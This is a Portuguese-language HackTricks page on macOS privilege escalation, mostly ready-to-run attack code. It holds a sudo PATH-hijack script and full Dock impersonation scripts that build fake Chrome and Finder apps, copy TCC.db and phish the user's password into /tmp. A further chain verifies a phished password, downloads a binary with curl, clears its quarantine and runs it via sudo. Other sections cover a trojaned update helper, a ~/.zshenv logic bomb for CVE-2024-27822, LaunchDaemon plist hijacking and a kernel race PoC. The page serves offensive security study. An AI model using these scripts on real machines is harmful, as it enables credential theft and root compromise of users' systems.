# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Se você veio aqui procurando por TCC privilege escalation, acesse:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Observe que **a maioria dos truques de privilege escalation que afetam Linux/Unix também afetará máquinas MacOS**. Portanto, consulte:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Você pode encontrar a [técnica original Sudo Hijacking na publicação Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

No entanto, o macOS **mantém** o **`PATH`** do usuário quando ele executa o **`sudo`**. Isso significa que outra forma de realizar esse ataque seria **sequestrar outros binários** que a vítima ainda executará ao **executar o sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Observe que um usuário que utiliza o terminal provavelmente terá o **Homebrew instalado**. Portanto, é possível sequestrar binários em **`/opt/homebrew/bin`**.

### Impersonação do Dock

Usando alguma **engenharia social**, você poderia **se passar, por exemplo, pelo Google Chrome** dentro do Dock e, na prática, executar seu próprio script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Algumas sugestões:

- Verifique no Dock se existe um Chrome e, nesse caso, **remova** essa entrada e **adicione** a entrada do **Chrome falso** na **mesma posição** no array do Dock.

<details>
<summary>Script de impersonação do Chrome no Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Algumas sugestões:

- Você **não pode remover o Finder do Dock**, portanto, se for adicioná-lo ao Dock, pode colocar o Finder falso logo ao lado do real. Para isso, você precisa **adicionar a entrada do Finder falso no início do array do Dock**.
- Outra opção é não colocá-lo no Dock e apenas abri-lo; "Finder pedindo para controlar o Finder" não é algo tão estranho.
- Outra opção para **escalar para root sem pedir** a senha com uma caixa de diálogo horrível é fazer o Finder realmente pedir a senha para executar uma ação privilegiada:
- Pedir ao Finder para copiar um novo arquivo **`sudo`** para **`/etc/pam.d`** (O prompt que pede a senha indicará que "o Finder quer copiar sudo")
- Pedir ao Finder para copiar um novo **Authorization Plugin** (Você poderia controlar o nome do arquivo para que o prompt que pede a senha indique que "o Finder quer copiar Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing de prompt de password + reutilização de sudo

Malware frequentemente abusa da interação do usuário para **capturar uma password capaz de usar sudo** e reutilizá-la programaticamente. Um fluxo comum:

1. Identificar o usuário conectado com `whoami`.
2. **Repetir os prompts de password** até que `dscl . -authonly "$user" "$pw"` retorne sucesso.
3. Armazenar a credencial em cache (por exemplo, `/tmp/.pass`) e executar ações privilegiadas com `sudo -S` (password via stdin).

Exemplo de cadeia mínima:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
A senha roubada pode então ser reutilizada para **limpar a quarentena do Gatekeeper com `xattr -c`**, copiar LaunchDaemons ou outros arquivos privilegiados e executar estágios adicionais de forma não interativa.

## Vetores específicos de versões mais recentes do macOS (2023–2025)

### `AuthorizationExecuteWithPrivileges` ainda pode ser usado

`AuthorizationExecuteWithPrivileges` foi descontinuado na versão 10.7, mas **ainda funciona no Sonoma/Sequoia**. Muitos atualizadores comerciais invocam `/usr/libexec/security_authtrampoline` com um caminho não confiável. Se o binário-alvo puder ser gravado pelo usuário, você poderá inserir um trojan e aproveitar o prompt legítimo:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combine com os **masquerading tricks acima** para apresentar um diálogo de senha convincente.


### Triagem de helper privilegiado / XPC

Muitos privescs modernos de terceiros no macOS seguem o mesmo padrão: um **LaunchDaemon root** expõe um **serviço Mach/XPC** a partir de **`/Library/PrivilegedHelperTools`**, então o helper não valida o cliente, valida-o **tarde demais** (PID race) ou expõe um **método root** que consome um **path/script controlado pelo usuário**. Essa é a classe de bug por trás de muitos bugs recentes em helpers de VPN clients, game launchers e updaters.<sup>[4]</sup>

Checklist rápido de triagem:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Preste atenção especial a helpers que:

- continuam aceitando requests **após a desinstalação** porque o job permaneceu carregado no `launchd`
- executam scripts ou leem configurações de **`/Applications/...`** ou de outros caminhos graváveis por usuários não-root
- dependem de validação de peer baseada em **PID** ou apenas em **bundle-id**, que pode estar sujeita a race conditions

Para obter mais detalhes sobre bugs de autorização em helpers, consulte [esta página](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Herança do ambiente de scripts do PackageKit (CVE-2024-27822)

Até a Apple corrigir o problema no **Sonoma 14.5**, **Ventura 13.6.7** e **Monterey 12.7.5**, instalações iniciadas pelo usuário via **`Installer.app`** / **`PackageKit.framework`** podiam executar **scripts PKG como root dentro do ambiente do usuário atual**. Isso significa que um pacote que usasse **`#!/bin/zsh`** carregaria o **`~/.zshenv`** do atacante e o executaria como **root** quando a vítima instalasse o pacote.<sup>[3]</sup>

Isso é especialmente interessante como uma **logic bomb**: basta obter um foothold na conta do usuário e ter um arquivo de inicialização do shell gravável; depois, aguarde até que qualquer installer vulnerável baseado em **zsh** seja executado pelo usuário. Isso geralmente **não** se aplica a deployments de **MDM/Munki**, pois eles são executados dentro do ambiente do usuário root.<sup>[3]</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Se quiser uma análise mais aprofundada sobre abuso específico de installers, consulte também [esta página](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Sequestro de plist de LaunchDaemon (padrão CVE-2025-24085)

Se um plist de LaunchDaemon ou o destino de seu `ProgramArguments` for **gravável pelo usuário**, você poderá escalar privilégios substituindo-o e, em seguida, forçando o launchd a recarregá-lo:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Isso espelha o padrão de exploit publicado para **CVE-2025-24085**, em que um plist gravável foi abusado para executar código do atacante como root.

### XNU SMR credential race (CVE-2025-24118)

Uma **race em `kauth_cred_proc_update`** permite que um atacante local corrompa o ponteiro de credenciais somente leitura (`proc_ro.p_ucred`) ao executar loops de `setgid()`/`getgid()` entre threads até que ocorra um `memcpy` interrompido. A corrupção bem-sucedida resulta em **uid 0** e acesso à memória do kernel. Estrutura mínima do PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Combine com heap grooming para posicionar dados controlados onde o ponteiro é relido. Em builds vulneráveis, isso proporciona uma **local kernel privesc** confiável sem exigir bypass do SIP.<sup>[2]</sup>

### SIP bypass via Migration Assistant ("Migraine", CVE-2023-32369)

Se você já possui root, o SIP ainda bloqueia gravações em locais do sistema. O bug **Migraine** abusa do entitlement do Migration Assistant `com.apple.rootless.install.heritable` para gerar um processo filho que herda o SIP bypass e sobrescreve paths protegidos (por exemplo, `/System/Library/LaunchDaemons`).<sup>[1]</sup> A cadeia:

1. Obter root em um sistema em execução.
2. Acionar o `systemmigrationd` com um estado especialmente criado para executar um binário controlado pelo atacante.
3. Usar o entitlement herdado para modificar arquivos protegidos pelo SIP, mantendo a persistência mesmo após a reinicialização.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Vários daemons da Apple aceitam objetos **NSPredicate** via XPC e validam apenas o campo `expressionType`, que é controlado pelo atacante. Ao criar um predicate que avalia selectors arbitrários, é possível obter **code execution em serviços XPC root/system** (por exemplo, `coreduetd`, `contextstored`). Quando combinado com um app sandbox escape inicial, isso concede **privilege escalation sem prompts ao usuário**. Procure endpoints XPC que desserializam predicates e não possuem um visitor robusto.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Qualquer usuário** (mesmo sem privilégios) pode criar e montar um snapshot do Time Machine com `-o noowners` e **acessar TODOS os arquivos** desse snapshot, contornando as verificações de ownership no volume ativo. O único privilégio necessário é que o aplicativo utilizado (como o `Terminal`) tenha **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Os comandos e a explicação completa estão na página de TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Isso pode ser útil para realizar privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
